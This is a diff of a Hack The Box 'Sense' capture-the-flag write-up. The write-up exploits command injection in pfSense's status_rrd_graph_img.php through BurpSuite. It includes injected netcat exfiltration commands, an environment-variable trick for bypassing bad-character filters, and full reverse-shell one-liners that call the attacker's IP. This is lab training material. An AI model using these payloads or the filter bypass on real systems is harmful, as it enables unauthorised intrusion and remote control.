@@ -1,7 +1,7 @@
 ---
 layout: single
 title: Sense - Hack The Box
-excerpt: ""
+excerpt: "Sense is based on the Pfsense software, where we will exploit a vulnerability in the way the exec() function is called. Using a public script, inject commands and enter a reverse shell. We''ll understand the script to abuse this vulnerability manually through BurpSuite, while learning how to bypass badchars by abusing command injection to create 'malicious' environment variables."
 date: 2021-08-23
 classes: wide
 header:
@@ -15,17 +15,19 @@ tags:
   - FreeBSD
   - BurpSuite
   - Command Injection
+  - Pfsense
+  - Web
 ---
 
-![](/assets/images/htb-writeup-sense/sense_logo.png)
-
 # Description
+Sense is based on the Pfsense software, where we will exploit a vulnerability in the way the exec() function is called. Using a public script, inject commands and enter a reverse shell. We’‘ll understand the script to abuse this vulnerability manually through BurpSuite, while learning how to bypass badchars by abusing command injection to create “malicious” environment variables.
 
-Description
+![](/assets/images/htb-writeup-sense/sense-statics.png)
 
-# Recognition phase
 
-I will do a TCP SYN Port Scan because the normal scan is too slow.
+## Recognition phase
+
+TCP SYN Port Scan.
 
 ```
 nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.10.60 -oN allPorts
@@ -67,6 +69,7 @@ It is a pfSense, a free, open source distribution based on FreeBSD, customized t
 
 ![](/assets/images/htb-writeup-sense/login-panel.png)
 
+<br>
 My first step when I saw this is to investigate the default credentials, I found user:admin password:pfsense, but they didn't work, so I will opt to use ffuf.
 
 ```
@@ -104,8 +107,9 @@ filebrowser             [Status: 301, Size: 0, Words: 1, Lines: 1]
 
 - -c For colorized output.
 - -e .php,.txt for extensions becouse the vast majority of the code is in PHP (front and back-end) and .txt becouse I always include it I don't have much information.
+<br>
 
-### Let's visit the most interesting urls.
+## Let's visit the most interesting urls.
 
 The only ones that have some interesting information and we don't need to be logged in to see them are system-users.txt, changelog.txt and tree.
 
@@ -118,6 +122,7 @@ The only ones that have some interesting information and we don't need to be log
 ## https://10.10.10.60/tree
 ![](/assets/images/htb-writeup-sense/tree.png)
 
+<br>
 Ok, let's pause and see what we have so far. 
 - I googled about /tree as it details the version but there is nothing interesting.
 - /system-users.txt has a username and password to try in the login panel.
@@ -400,10 +405,10 @@ d08c32a5d4..
 Done!
 When I searched searchsploit for a vulnerability I noticed that the bug was in 'status_rrd_rrd_graph_img.php', I researched about this and I would like to exploit it manually from BrupSuite, let's see how to do it.
 
-# Exploiting pfsense manually.
+## Exploiting pfsense manually.
 
 ### Open BurpSuite and set the target.
-![](/assets/images/htb-writeup-sense/Screenshot_1.png)
+![](/assets/images/htb-writeup-sense/set-target.png)
 
 ### Configure the browser with the proxy to intercept the requests, I use [FoxyProxy](https://addons.mozilla.org/en-US/firefox/addon/foxyproxy-standard/) and let's analyze the above script made in python3.
 
@@ -417,16 +422,13 @@ Then delete the payload and enter the command that we want to be injected, activ
 Basically the vulnerable URL would be as follows: [https://10.10.10.60/status_rrd_graph_img.php?database=queues;INJECT COMMAND HERE]
 
 ### Foxy proxy activated.
-![](/assets/images/htb-writeup-sense/Screenshot_1.png)
+![](/assets/images/htb-writeup-sense/foxy-proxy.png)
 
 ### BurpSuite intercept on.
-![](/assets/images/htb-writeup-sense/Screenshot_2.png)
+![](/assets/images/htb-writeup-sense/intercept-on.png)
 
-### Request intercepted.
-![](/assets/images/htb-writeup-sense/Screenshot_3.png)
-
-### Send it to repeater. [With Ctrl+R]
-![](/assets/images/htb-writeup-sense/Screenshot_4.png)
+### Intercept the request and send it to the repeater with Ctrl+R.
+![](/assets/images/htb-writeup-sense/send-to-repeater.png)
 
 ### Try it with a test command to see if it works correctly.
 Let's try a simple ```echo "test"``` piped with netcat to send it to our attacker's machine.
@@ -435,7 +437,7 @@ Full command: ```echo+"test"|nc+10.10.14.6+443```
 
 Piping it with nectat ```|nc+10.10.14.6+443``` causes the output of the previous command, in this case the ```echo+"test"``` to be sent to the ip indicated by the specified port. The reason why I write the + character instead of a space is to avoid problems and that it interprets it correctly, basically url encode the space.
 
-![](/assets/images/htb-writeup-sense/Screenshot_5.png)
+![](/assets/images/htb-writeup-sense/test-cmd-injection.png)
 
 Listen on port 443 and wait to receive the output.
 ```
@@ -451,7 +453,7 @@ Looking for a reverse shell by nc in this repo, I recommend it. [Reverse Shell C
 
 I'll try with nc -c /bin/sh 10.10.14.6 443
 
-![](/assets/images/htb-writeup-sense/Screenshot_5.png)
+![](/assets/images/htb-writeup-sense/nc-bash.png)
 
 ```
 root@kali:/# nc -nlvp 443
@@ -463,15 +465,15 @@ The badchars are invalid or "bad" characters which the program to exploit does n
 ### Looking for ways to bypasse.
 
 
-First let's find out which is the badchar starting with / echo+"test+badchar+/"|nc+10.10.14.6+443.
-![](/assets/images/htb-writeup-sense/Screenshot_6.png)
+First let's find out which is the badchar starting with / ```echo+"test+badchar+/"|nc+10.10.14.6+443```.
+![](/assets/images/htb-writeup-sense/badchar-bar.png)
 
 ```
 root@kali:/# nc -nlvp 443
 listening on [any] 443 ...
 ```
 It does not work, let's remove the / character to check that everything is correct.
-![](/assets/images/htb-writeup-sense/Screenshot_7.png)
+![](/assets/images/htb-writeup-sense/without-badchar.png)
 
 
 ```
@@ -482,7 +484,7 @@ test badchar
 ```
 
 This way it works, this means that / is a badchar, now let's try with the character -
-![](/assets/images/htb-writeup-sense/Screenshot_14.png)
+![](/assets/images/htb-writeup-sense/badchar_-.png)
 
 ```
 root@kali:/# nc -nlvp 443
@@ -493,7 +495,7 @@ It doesn't work, - it's another badchar.
 To bypass it let's first try URL encoding the badchar.
 
 The - character is %2d url encoded.
-![](/assets/images/htb-writeup-sense/Screenshot_15.png)
+![](/assets/images/htb-writeup-sense/guion-urlencoded.png)
 
 ```
 root@kali:/#
@@ -503,14 +505,14 @@ listening on [any] 443 ...
 
 It doesn't work either, so we have to find another way.
 
-# Lateral thinking.
+## Lateral thinking.
 We are having command injection on the victim machine, one thing that we can do is to create an environment variable whose value is to print the / character. 
 When we want to see the value of that variable, it will print the character /, the important thing about this is that it is already defined at the system level in the victim computer, it will not filter or block it as badchar when we enter it in the URL, because when we call the "malicious" environment variable in the URL it will print the character we need.
 
 Let's see a practical example to understand it more thoroughly.
 
 Let's look at the environment variables already created on the victim computer.
-![](/assets/images/htb-writeup-sense/Screenshot_8.png)
+![](/assets/images/htb-writeup-sense/env.png)
 
 ```
 nc -nlvp 443
@@ -525,10 +527,10 @@ PHP_FCGI_CHILDREN=1
 PWD=/var/db/rrd
 ```
 
-Now let's create the environment variable whose value is to print the character /, basically its value would be: echo "/". But we cannot send the / character through the URL because it is a badchar, so we have to write / in octal, it would be like this: \057
-This we can see it from console with the command man ascii or searching in google a table of octal values, for example [This](https://www-k12.atmos.washington.edu/~ovens/gmt/doc/html/GMT_Docs/node153.html), then to create the environment variable we use the syntax newEnvVar=($value of the variable), in this case it would be bar=$$(printf "\057")
-Why printf and not echo? because unlike echo, the printf function can write any combination of numeric values, single characters and strings. This does not mean that with echo we can' t do it, but with printf we ensure a correct operation.
-![](/assets/images/htb-writeup-sense/Screenshot_9.png)
+Now let's create the environment variable whose value is to print the character /, basically its value would be: ```echo "/"```. But we cannot send the / character through the URL because it is a badchar, so we have to write / in octal, it would be like this: \057
+This we can see it from console with the command ```man ascii``` or searching in google a table of octal values, for example [This](https://www-k12.atmos.washington.edu/~ovens/gmt/doc/html/GMT_Docs/node153.html), then to create the environment variable we use the syntax ```newEnvVar=($value-of-the-variable)```, in this case it would be ```bar=$(printf "\057")```
+Why printf and not echo? because unlike echo, the printf function can write any combination of numeric values, single characters and strings.
+![](/assets/images/htb-writeup-sense/create-first-var.png)
 
 ```
 root@kali:/#
@@ -538,9 +540,9 @@ connect to [10.10.14.6] from (UNKNOWN) [10.10.10.60] 2549
 /
 ```
 
-It works! We know that the victim machine has netcat so let's send us a reverse shell with a typical nc -c /bin/bash 10.10.14.6 443 replacing the badchars as seen above.
+It works! We know that the victim machine has netcat so let's send us a reverse shell with a typical ```nc -c /bin/bash 10.10.14.6 443``` replacing the badchars as seen above.
 Then what we have to do is to create two environment variables, one for the / character and one for the -, let's see the practical example:
-![](/assets/images/htb-writeup-sense/Screenshot_10.png)
+![](/assets/images/htb-writeup-sense/failed-rshell.png)
 
 To replace the characters by the environment variables could be done manually, but I suggest to do it with utilities like tr or sed as in this case. It is useful to practice hehe.
 
@@ -549,13 +551,13 @@ roo@kali:/# echo "nc -c /bin/bash 10.10.14.6 443" | tr ' ' '+' | sed 's/\//${bar
 
 nc+${guion}c+${bar}bin${bar}bash+10.10.14.6+443
 ```
-# Send the reverse shell through BurpSuite
+### Send the reverse shell through BurpSuite
 
 ```
 root@kali:/# nc -nlvp 443
 listening on [any] 443 ...
 ```
-It doesn't work, I tried changing the -c parameter of nectat for -e but it doesn't work either, so I'll do it with the old version of nectat, it would be like this: rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.1.2 443 >/tmp/f
+It doesn't work, I tried changing the -c parameter of nectat for -e but it doesn't work either, so I'll do it with the old version of nectat, it would be like this: ```rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.1.2 443 >/tmp/f```
 
 All this can be seen in the repository I named above.
 
@@ -589,7 +591,7 @@ root@kali:/# echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.1
 rm+${bar}tmp${bar}f;mkfifo+${bar}tmp${bar}f;cat+${bar}tmp${bar}f|${bar}bin${bar}sh+${guion}i+2>${amp}1|nc+10.10.14.6+443+>${bar}tmp${bar}f
 ```
 
-![](/assets/images/htb-writeup-sense/Screenshot_12.png)
+![](/assets/images/htb-writeup-sense/succesful-rshell.png)
 
 ```
 root@kali:/# nc -nlvp 443
